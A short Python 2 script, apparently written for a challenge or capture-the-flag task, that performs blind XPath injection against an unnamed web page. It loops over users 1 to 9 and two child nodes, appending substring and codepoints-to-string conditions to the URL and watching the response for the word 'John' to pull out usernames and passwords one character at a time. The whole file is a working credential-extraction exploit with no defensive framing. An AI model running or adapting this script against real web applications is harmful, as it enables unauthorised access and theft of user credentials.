import requests

page = ""
cooki = {'che' : '1','spip_session' : ''}
 
 
child_node_pos=0
charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
continuer=True
 
for user in range(1,10):
        print "user:"+str(user)
        passwd=""
        for child_node_pos in (4,6): 
                print " - noeud:"+str(child_node_pos)
                for t in range(1,50):
                        if continuer:
                                continuer=False
                                for carac in charset:
                                        req=page+"+and+substring(//user["+str(user)+"]/child::node()["+str(child_node_pos)+"],"+str(t)+",1)=codepoints-to-string("+str(ord(carac))+")"
                                        res = requests.get(req,cookies=cooki)
 
                                        if "John" in res.text:
                                                passwd+=carac
                                                continuer=True
                                                print passwd
                                                break
                        else:
                                print passwd
                                t=1
                                continuer=True
                                passwd+=":"
                                break

